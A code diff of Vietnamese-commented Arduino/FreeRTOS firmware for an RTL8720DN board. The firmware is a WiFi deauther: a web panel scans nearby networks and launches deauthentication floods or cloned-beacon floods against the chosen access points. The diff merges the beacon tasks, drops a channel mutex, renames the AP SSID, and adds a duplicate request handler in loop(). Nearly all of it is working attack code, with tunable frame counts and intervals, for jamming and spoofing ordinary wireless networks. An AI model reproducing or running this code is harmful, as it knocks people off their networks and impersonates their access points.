@@ -13,7 +13,6 @@
 // Bao gồm FreeRTOS (nếu SDK BW16 đã tích hợp FreeRTOS)
 #include <FreeRTOS.h>
 #include <task.h>
-#include <semphr.h>
 
 // Nếu LED đã được định nghĩa trong variant thì không định nghĩa lại
 #ifndef LED_R
@@ -29,7 +28,7 @@
 // --------------------------------------------------
 // Các trạng thái của mạch
 enum DeviceState {
-  STATE_IDLE,     // Idle: Không hoạt động – LED sẽ tắt nếu không có client
+  STATE_IDLE,     // Chỉ AP hoạt động
   STATE_SCANNING, // Đang quét mạng
   STATE_ATTACK,   // Đang tấn công deauth
   STATE_BEACON    // Đang phát Beacon (nhái)
@@ -37,13 +36,11 @@ enum DeviceState {
 
 volatile DeviceState currentState = STATE_IDLE;  // volatile vì được truy cập từ nhiều task
 
-// Biến để theo dõi trạng thái kết nối của client trên WebServer
-volatile bool clientConnected = false;
-
 // Các hằng số LED pattern (millisecond)
-const unsigned long BLINK_INTERVAL_ATTACK   = 1000;
-const unsigned long BLINK_INTERVAL_SCANNING = 500;
-const unsigned long BLINK_INTERVAL_BEACON   = 1000;
+const unsigned long BLINK_INTERVAL_IDLE  = 1500;
+const unsigned long BLINK_INTERVAL_ATTACK  = 1000;
+const unsigned long BLINK_INTERVAL_SCANNING = 200;
+const unsigned long BLINK_INTERVAL_BEACON   = 1000; // ví dụ: LED nhấp nháy theo chế độ beacon
 
 // --------------------------------------------------
 // Cấu trúc lưu trữ kết quả quét WiFi
@@ -56,7 +53,7 @@ struct WiFiScanResult {
 };
 
 // Thông tin AP cho chế độ Access Point
-const char *ssid_ap = "BW16";
+const char *ssid_ap = "☠";
 const char *pass_ap = "deauther";
 
 // Kênh mặc định (có thể thay đổi theo môi trường)
@@ -80,18 +77,14 @@ uint8_t deauth_bssid[6];
 const uint16_t DEFAULT_DEAUTH_REASON = 2;
 uint16_t deauth_reason = DEFAULT_DEAUTH_REASON;
 
-// --------------------------------------------------
-// Số frame gửi mỗi chu kỳ cho từng băng
+// Thay vì dùng hằng số chung, ta tách riêng số frame cho mỗi băng:
 #define FRAMES_PER_DEAUTH_24 5    // số frame deauth gửi cho băng 2.4GHz
-#define FRAMES_PER_DEAUTH_5  10   // số frame deauth gửi cho băng 5GHz
-#define FRAMES_PER_BEACON    200  // số frame beacon gửi mỗi lần
+#define FRAMES_PER_DEAUTH_5  10    // số frame deauth gửi cho băng 5GHz
+#define FRAMES_PER_BEACON    200   // số frame beacon gửi mỗi lần
 
 // --------------------------------------------------
 // Các khoảng thời gian riêng cho tấn công từng băng (ms)
-// Dựa vào giả định:
-// - 2.4GHz: 5 frame * 5ms = 25ms + overhead ~10ms → khoảng 35ms (đặt interval = 40ms để có dư)
-// - 5GHz: 10 frame * 5ms = 50ms + overhead ~40ms → khoảng 90ms (đặt interval = 90ms)
-const unsigned long ATTACK_INTERVAL_24 = 40;
+const unsigned long ATTACK_INTERVAL_24 = 35;
 const unsigned long ATTACK_INTERVAL_5  = 90;
 unsigned long lastAttackTime24 = 0;
 unsigned long lastAttackTime5  = 0;
@@ -103,46 +96,41 @@ static int currentBeaconIndex24 = 0;
 static int currentBeaconIndex5  = 0;
 
 // --------------------------------------------------
-// Mutex để đồng bộ chuyển kênh (sử dụng cho cả tấn công và beacon)
-SemaphoreHandle_t channelMutex = NULL;
-
-// --------------------------------------------------
 // Hàm cập nhật LED theo trạng thái (non‑blocking)
-// Ở đây, trong chế độ STATE_IDLE, LED sẽ chỉ sáng nếu có client kết nối (clientConnected == true)
+// (Phần LED giữ nguyên như cũ)
 void updateLEDs() {
   static unsigned long lastToggleTime = 0;
   static bool ledState = false;
   unsigned long now = millis();
-  
-  // Tắt toàn bộ LED trước khi cập nhật
+  // Tắt tất cả LED trước khi cập nhật
   digitalWrite(LED_R, LOW);
   digitalWrite(LED_G, LOW);
   digitalWrite(LED_B, LOW);
-  
+
   if (currentState == STATE_IDLE) {
-    // Ở idle, LED không sáng nếu không có client kết nối; nếu có, bật LED_R
-    digitalWrite(LED_R, clientConnected ? HIGH : LOW);
-  }
-  else if (currentState == STATE_SCANNING) {
+    if (now - lastToggleTime >= BLINK_INTERVAL_IDLE) {
+      ledState = !ledState;
+      lastToggleTime = now;
+    }
+    digitalWrite(LED_R, ledState ? HIGH : LOW);
+  } else if (currentState == STATE_SCANNING) {
     if (now - lastToggleTime >= BLINK_INTERVAL_SCANNING) {
       ledState = !ledState;
       lastToggleTime = now;
     }
-    digitalWrite(LED_B, ledState ? HIGH : LOW);
-  }
-  else if (currentState == STATE_ATTACK) {
+    digitalWrite(LED_R, ledState ? HIGH : LOW);
+  } else if (currentState == STATE_ATTACK) {
     if (now - lastToggleTime >= BLINK_INTERVAL_ATTACK) {
       ledState = !ledState;
       lastToggleTime = now;
     }
     digitalWrite(LED_G, ledState ? HIGH : LOW);
-  }
-  else if (currentState == STATE_BEACON) {
+  } else if (currentState == STATE_BEACON) {
     if (now - lastToggleTime >= BLINK_INTERVAL_BEACON) {
       ledState = !ledState;
       lastToggleTime = now;
     }
-    digitalWrite(LED_R, ledState ? HIGH : LOW);
+    digitalWrite(LED_B, ledState ? HIGH : LOW);
   }
 }
 
@@ -151,7 +139,7 @@ void updateLEDs() {
 rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
   if (scan_result->scan_complete == 0) {
     rtw_scan_result_t *record = &scan_result->ap_details;
-    record->SSID.val[record->SSID.len] = 0;
+    record->SSID.val[record->SSID.len] = 0;  // đảm bảo chuỗi kết thúc
     WiFiScanResult result;
     result.ssid = String((const char *)record->SSID.val);
     result.channel = record->channel;
@@ -174,6 +162,7 @@ int scanNetworks() {
   DEBUG_SER_PRINT("Scanning WiFi networks (5s)...\n");
   scan_results.clear();
   if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS) {
+    // Sử dụng vTaskDelay để không chặn scheduler
     vTaskDelay(pdMS_TO_TICKS(5000));
     DEBUG_SER_PRINT("Scan done!\n");
     currentState = STATE_IDLE;
@@ -186,7 +175,7 @@ int scanNetworks() {
 }
 
 // --------------------------------------------------
-// Parse HTTP request: trả về URL (đã trim khoảng trắng)
+// Parse request HTTP: trả về URL (đã trim khoảng trắng)
 String parseRequest(String request) {
   if (request.length() == 0) return "";
   int path_start = request.indexOf(' ') + 1;
@@ -236,7 +225,8 @@ String makeResponse(int code, String content_type) {
 }
 
 // --------------------------------------------------
-// Giao diện Web (HTML)
+// Giao diện Web (HTML) – sử dụng CSS hiện đại, responsive
+// Hiển thị danh sách các mạng quét được; nếu SSID rỗng thì hiển thị "Hidden"
 void handleRoot(WiFiClient &client) {
   String response = makeResponse(200, "text/html") +
   R"(
@@ -247,6 +237,7 @@ void handleRoot(WiFiClient &client) {
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>RTL8720DN Deauther</title>
     <style>
+      /* Reset cơ bản */
       * { box-sizing: border-box; margin: 0; padding: 0; }
       body { font-family: Arial, Helvetica, sans-serif; background: #f2f4f8; color: #333; line-height: 1.4; padding: 5px; font-size: 14px; }
       .container { max-width: 960px; margin: 10px auto; background: #fff; border-radius: 8px; box-shadow: 0 3px 8px rgba(0,0,0,0.1); overflow: hidden; }
@@ -291,10 +282,15 @@ void handleRoot(WiFiClient &client) {
             </thead>
             <tbody>
   )";
+  // Hiển thị mỗi mạng quét được trong một dòng của bảng:
   for (uint32_t i = 0; i < scan_results.size(); i++) {
+    String display_ssid = scan_results[i].ssid;
+    if (display_ssid.length() == 0) {
+      display_ssid = "☠ʜɪᴅᴅᴇɴ ᴡɪꜰɪ☠";
+    }
     response += "<tr>";
     response += "<td><input type='checkbox' name='network' value='" + String(i) + "'></td>";
-    response += "<td>" + scan_results[i].ssid + "</td>";
+    response += "<td>" + display_ssid + "</td>";
     response += "<td>" + scan_results[i].bssid_str + "</td>";
     response += "<td>" + String(scan_results[i].channel) + "</td>";
     response += "<td>" + String(scan_results[i].rssi) + "</td>";
@@ -304,17 +300,17 @@ void handleRoot(WiFiClient &client) {
   response += R"(
             </tbody>
           </table>
-          <button type='submit' name='action' value='deauth' class='btn btn-launch'>Launch Deauth</button>
-          <button type='submit' name='action' value='beacon' class='btn btn-launch'>Launch Beacon</button>
+          <button type="submit" name="action" value="deauth" class="btn btn-launch">Launch Deauth</button>
+          <button type="submit" name="action" value="beacon" class="btn btn-launch">Launch Beacon</button>
         </form>
-        <form method='post' action='/rescan'>
-          <button type='submit' class='btn btn-rescan'>Rescan Networks</button>
+        <form method="post" action="/rescan">
+          <button type="submit" class="btn btn-rescan">Rescan Networks</button>
         </form>
   )";
   if (currentState == STATE_ATTACK || currentState == STATE_BEACON) {
     response += R"(
-      <form method='post' action='/stop'>
-        <button type='submit' class='btn btn-stop'>Stop Attack/Beacon</button>
+      <form method="post" action="/stop">
+        <button type="submit" class="btn btn-stop">Stop Attack/Beacon</button>
       </form>
     )";
   }
@@ -335,7 +331,7 @@ void handle404(WiFiClient &client) {
 }
 
 // --------------------------------------------------
-// Đối tượng WiFiServer toàn cục (port 80)
+// Khởi tạo đối tượng WiFiServer toàn cục (port 80)
 WiFiServer server(80);
 
 // --------------------------------------------------
@@ -356,7 +352,6 @@ void WebServerTask(void *pvParameters) {
   while (1) {
     WiFiClient client = server.available();
     if (client && client.connected()) {
-      clientConnected = true;
       String request;
       while (client.available()) {
         request += (char)client.read();
@@ -364,7 +359,6 @@ void WebServerTask(void *pvParameters) {
       }
       if (request.length() == 0 || request.indexOf("favicon.ico") >= 0) {
         client.stop();
-        clientConnected = false;
       } else {
         DEBUG_SER_PRINT("Request: " + request + "\n");
         String path = parseRequest(request);
@@ -375,8 +369,10 @@ void WebServerTask(void *pvParameters) {
           scanNetworks();
           handleRoot(client);
         } else if (path == "/action") {
+          // Xử lý form gửi từ trang chủ (có nút "deauth" hoặc "beacon")
           std::vector<std::pair<String, String>> post_data = parsePost(request);
           String action = "";
+          // Lấy tham số "action"
           for (auto &param : post_data) {
             if (param.first == "action") {
               action = param.second;
@@ -395,7 +391,7 @@ void WebServerTask(void *pvParameters) {
                     attack_targets_5.push_back(idx);
                   else
                     attack_targets_24.push_back(idx);
-                  DEBUG_SER_PRINT("Deauth target idx: " + String(idx) + " (" + ((ch >= 36) ? "5GHz" : "2.4GHz") + ")\n");
+                  DEBUG_SER_PRINT("Deauth target idx: " + String(idx) + " (" + ((ch>=36)?"5GHz":"2.4GHz") + ")\n");
                 }
               }
             }
@@ -418,7 +414,7 @@ void WebServerTask(void *pvParameters) {
                     beacon_targets_5.push_back(idx);
                   else
                     beacon_targets_24.push_back(idx);
-                  DEBUG_SER_PRINT("Beacon target idx: " + String(idx) + " (" + ((ch >= 36) ? "5GHz" : "2.4GHz") + ")\n");
+                  DEBUG_SER_PRINT("Beacon target idx: " + String(idx) + " (" + ((ch>=36)?"5GHz":"2.4GHz") + ")\n");
                 }
               }
             }
@@ -440,17 +436,14 @@ void WebServerTask(void *pvParameters) {
           handle404(client);
         }
         client.stop();
-        clientConnected = false;
       }
-    } else {
-      clientConnected = false;
     }
     vTaskDelay(pdMS_TO_TICKS(10));
   }
 }
 
 // --------------------------------------------------
-// Task: Thực hiện tấn công deauth cho cả 2 băng
+// Task: Thực hiện tấn công deauth (gửi deauth frames)
 void AttackTask(void *pvParameters) {
   (void) pvParameters;
   while (1) {
@@ -461,11 +454,7 @@ void AttackTask(void *pvParameters) {
       if (!attack_targets_24.empty() && (now - lastAttackTime24 >= ATTACK_INTERVAL_24)) {
         int idx = attack_targets_24[currentTargetIndex24];
         if (idx >= 0 && idx < (int)scan_results.size()) {
-          // Nếu cần đồng bộ chuyển kênh, có thể dùng channelMutex ở đây
-          if(xSemaphoreTake(channelMutex, portMAX_DELAY)) {
-            wext_set_channel(WLAN0_NAME, scan_results[idx].channel);
-            xSemaphoreGive(channelMutex);
-          }
+          wext_set_channel(WLAN0_NAME, scan_results[idx].channel);
           memcpy(deauth_bssid, scan_results[idx].bssid, 6);
           for (int j = 0; j < FRAMES_PER_DEAUTH_24; j++) {
             wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
@@ -481,10 +470,7 @@ void AttackTask(void *pvParameters) {
       if (!attack_targets_5.empty() && (now - lastAttackTime5 >= ATTACK_INTERVAL_5)) {
         int idx = attack_targets_5[currentTargetIndex5];
         if (idx >= 0 && idx < (int)scan_results.size()) {
-          if(xSemaphoreTake(channelMutex, portMAX_DELAY)) {
-            wext_set_channel(WLAN0_NAME, scan_results[idx].channel);
-            xSemaphoreGive(channelMutex);
-          }
+          wext_set_channel(WLAN0_NAME, scan_results[idx].channel);
           memcpy(deauth_bssid, scan_results[idx].bssid, 6);
           for (int j = 0; j < FRAMES_PER_DEAUTH_5; j++) {
             wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
@@ -501,61 +487,47 @@ void AttackTask(void *pvParameters) {
 }
 
 // --------------------------------------------------
-// ========= PHẦN CHỈNH SỬA: Tách BeaconTask thành 2 task riêng ========
-
-// Task: Gửi Beacon cho băng 2.4GHz
-void BeaconTask24(void *pvParameters) {
+// Task: Thực hiện phát Beacon (gửi beacon frames “nhái” thông tin mục tiêu)
+// Mỗi mục tiêu được gửi 20 beacon frame.
+void BeaconTask(void *pvParameters) {
   (void) pvParameters;
   uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
   while (1) {
-    if (currentState == STATE_BEACON && !beacon_targets_24.empty()) {
-      int idx = beacon_targets_24[currentBeaconIndex24];
-      if (idx >= 0 && idx < (int)scan_results.size()) {
-        // Sử dụng mutex để đồng bộ chuyển kênh
-        if(xSemaphoreTake(channelMutex, portMAX_DELAY)) {
+    if (currentState == STATE_BEACON) {
+      // Xử lý các mục tiêu băng 2.4GHz
+      if (!beacon_targets_24.empty()) {
+        int idx = beacon_targets_24[currentBeaconIndex24];
+        if (idx >= 0 && idx < (int)scan_results.size()) {
           wext_set_channel(WLAN0_NAME, scan_results[idx].channel);
-          xSemaphoreGive(channelMutex);
+          for (int j = 0; j < FRAMES_PER_BEACON; j++) {
+            // Gửi beacon frame với BSSID và SSID lấy từ mục tiêu đã chọn
+            wifi_tx_beacon_frame(scan_results[idx].bssid, broadcast, scan_results[idx].ssid.c_str());
+            vTaskDelay(pdMS_TO_TICKS(5));
+          }
+          DEBUG_SER_PRINT("Beacon sent for 2.4GHz target idx: " + String(idx) + "\n");
         }
-        for (int j = 0; j < FRAMES_PER_BEACON; j++) {
-          wifi_tx_beacon_frame(scan_results[idx].bssid, broadcast, scan_results[idx].ssid.c_str());
-          vTaskDelay(pdMS_TO_TICKS(5));
-        }
-        DEBUG_SER_PRINT("Beacon sent for 2.4GHz target idx: " + String(idx) + "\n");
+        currentBeaconIndex24 = (currentBeaconIndex24 + 1) % beacon_targets_24.size();
       }
-      currentBeaconIndex24 = (currentBeaconIndex24 + 1) % beacon_targets_24.size();
+      // Xử lý các mục tiêu băng 5GHz
+      if (!beacon_targets_5.empty()) {
+        int idx = beacon_targets_5[currentBeaconIndex5];
+        if (idx >= 0 && idx < (int)scan_results.size()) {
+          wext_set_channel(WLAN0_NAME, scan_results[idx].channel);
+          for (int j = 0; j < FRAMES_PER_BEACON; j++) {
+            wifi_tx_beacon_frame(scan_results[idx].bssid, broadcast, scan_results[idx].ssid.c_str());
+            vTaskDelay(pdMS_TO_TICKS(5));
+          }
+          DEBUG_SER_PRINT("Beacon sent for 5GHz target idx: " + String(idx) + "\n");
+        }
+        currentBeaconIndex5 = (currentBeaconIndex5 + 1) % beacon_targets_5.size();
+      }
     }
     vTaskDelay(pdMS_TO_TICKS(10));
   }
 }
-
-// Task: Gửi Beacon cho băng 5GHz
-void BeaconTask5(void *pvParameters) {
-  (void) pvParameters;
-  uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
-  while (1) {
-    if (currentState == STATE_BEACON && !beacon_targets_5.empty()) {
-      int idx = beacon_targets_5[currentBeaconIndex5];
-      if (idx >= 0 && idx < (int)scan_results.size()) {
-        if(xSemaphoreTake(channelMutex, portMAX_DELAY)) {
-          wext_set_channel(WLAN0_NAME, scan_results[idx].channel);
-          xSemaphoreGive(channelMutex);
-        }
-        for (int j = 0; j < FRAMES_PER_BEACON; j++) {
-          wifi_tx_beacon_frame(scan_results[idx].bssid, broadcast, scan_results[idx].ssid.c_str());
-          vTaskDelay(pdMS_TO_TICKS(5));
-        }
-        DEBUG_SER_PRINT("Beacon sent for 5GHz target idx: " + String(idx) + "\n");
-      }
-      currentBeaconIndex5 = (currentBeaconIndex5 + 1) % beacon_targets_5.size();
-    }
-    vTaskDelay(pdMS_TO_TICKS(10));
-  }
-}
-
-// ================================================================
 
 // --------------------------------------------------
-// setup(): Khởi tạo WiFi AP, quét mạng ban đầu và tạo các task FreeRTOS
+// setup(): khởi tạo WiFi AP, quét mạng ban đầu và tạo các task FreeRTOS
 void setup() {
   // Cấu hình chân LED
   pinMode(LED_R, OUTPUT);
@@ -572,23 +544,111 @@ void setup() {
   scanNetworks();
 
   currentState = STATE_IDLE;
-
-  // Tạo mutex cho chuyển kênh
-  channelMutex = xSemaphoreCreateMutex();
+  digitalWrite(LED_R, HIGH);  // Idle: LED đỏ sáng ban đầu
 
   // Tạo các task FreeRTOS
   xTaskCreate(LEDUpdateTask, "LEDUpdate", 1024, NULL, 1, NULL);
   xTaskCreate(WebServerTask, "WebServer", 4096, NULL, 1, NULL);
   xTaskCreate(AttackTask, "Attack", 2048, NULL, 2, NULL);
-
-  // Thay vì dùng một task BeaconTask duy nhất, ta tạo 2 task riêng cho từng băng:
-  xTaskCreate(BeaconTask24, "Beacon24", 2048, NULL, 2, NULL);
-  xTaskCreate(BeaconTask5,  "Beacon5", 2048, NULL, 2, NULL);
+  xTaskCreate(BeaconTask, "Beacon", 2048, NULL, 2, NULL);
 }
 
 // --------------------------------------------------
-// loop(): Không cần xử lý HTTP vì đã được WebServerTask đảm nhiệm.
+// loop()
 void loop() {
   updateLEDs();
-  // Các tác vụ nền khác có thể được thực hiện ở đây nếu cần.
+
+  // Xử lý HTTP nếu cần (trường hợp không dùng task WebServer)
+  WiFiClient client = server.available();
+  if (client.connected()) {
+    String request;
+    while (client.available()) {
+      request += (char)client.read();
+      delay(1);
+    }
+    
+    if (request.length() == 0 || request.indexOf("favicon.ico") >= 0) {
+      client.stop();
+      return;
+    }
+    
+    DEBUG_SER_PRINT("Request: " + request + "\n");
+    String path = parseRequest(request);
+    DEBUG_SER_PRINT("Path: " + path + "\n");
+
+    if (path == "/" || path == "/index.html") {
+      handleRoot(client);
+    } 
+    else if (path == "/rescan") {
+      scanNetworks();
+      handleRoot(client);
+    } 
+    else if (path == "/action") {
+      std::vector<std::pair<String, String>> post_data = parsePost(request);
+      String action = "";
+      for (auto &param : post_data) {
+        if (param.first == "action") {
+          action = param.second;
+          break;
+        }
+      }
+      if (action == "deauth") {
+        attack_targets_24.clear();
+        attack_targets_5.clear();
+        for (auto &param : post_data) {
+          if (param.first == "network") {
+            int idx = param.second.toInt();
+            if (idx >= 0 && idx < (int)scan_results.size()) {
+              uint8_t ch = scan_results[idx].channel;
+              if (ch >= 36)
+                attack_targets_5.push_back(idx);
+              else
+                attack_targets_24.push_back(idx);
+              DEBUG_SER_PRINT("Deauth target idx: " + String(idx) + " (" + ((ch>=36)?"5GHz":"2.4GHz") + ")\n");
+            }
+          }
+        }
+        if (!attack_targets_24.empty() || !attack_targets_5.empty()) {
+          currentState = STATE_ATTACK;
+          currentTargetIndex24 = 0;
+          currentTargetIndex5 = 0;
+          lastAttackTime24 = millis();
+          lastAttackTime5  = millis();
+        }
+      } else if (action == "beacon") {
+        beacon_targets_24.clear();
+        beacon_targets_5.clear();
+        for (auto &param : post_data) {
+          if (param.first == "network") {
+            int idx = param.second.toInt();
+            if (idx >= 0 && idx < (int)scan_results.size()) {
+              uint8_t ch = scan_results[idx].channel;
+              if (ch >= 36)
+                beacon_targets_5.push_back(idx);
+              else
+                beacon_targets_24.push_back(idx);
+              DEBUG_SER_PRINT("Beacon target idx: " + String(idx) + " (" + ((ch>=36)?"5GHz":"2.4GHz") + ")\n");
+            }
+          }
+        }
+        if (!beacon_targets_24.empty() || !beacon_targets_5.empty()) {
+          currentState = STATE_BEACON;
+          currentBeaconIndex24 = 0;
+          currentBeaconIndex5 = 0;
+        }
+      }
+      handleRoot(client);
+    } else if (path == "/stop") {
+      currentState = STATE_IDLE;
+      attack_targets_24.clear();
+      attack_targets_5.clear();
+      beacon_targets_24.clear();
+      beacon_targets_5.clear();
+      handleRoot(client);
+    } else {
+      handle404(client);
+    }
+    client.stop();
+  }
+  // Nếu dùng task WebServer, loop() không cần xử lý HTTP liên tục.
 }
